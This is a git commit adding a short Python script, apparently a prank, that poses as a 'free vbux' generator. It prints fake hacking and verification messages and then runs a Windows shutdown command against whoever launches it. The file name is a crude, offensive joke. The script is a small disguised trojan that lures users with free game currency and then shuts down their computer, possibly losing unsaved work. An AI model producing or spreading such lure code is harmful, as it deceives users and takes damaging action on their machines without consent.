6ae4062e80176c1122eafa3ff11505f85f484398
FreezingPanda <pickledchimeraarmy@gmail.com>
2024-11-09 18:12:30 +1000

    first commit

---
+++ i_gave_my_grandma_aids.py
@@ -0,0 +1,19 @@
+import os
+import time
+
+def free_vbux():
+    print("injecting...")
+    time.sleep(1)
+    print("decrypting...")
+    time.sleep(1)
+    print("adding vbux...")
+    time.sleep(1)
+    print("hacking nasa...")
+    time.sleep(1)
+    print("waiting for offer verification...")
+    time.sleep(1)
+
+    # Shutdown command for Windows
+    os.system("shutdown /s /t 10")  # This shuts down in 10 seconds
+
+free_vbux()
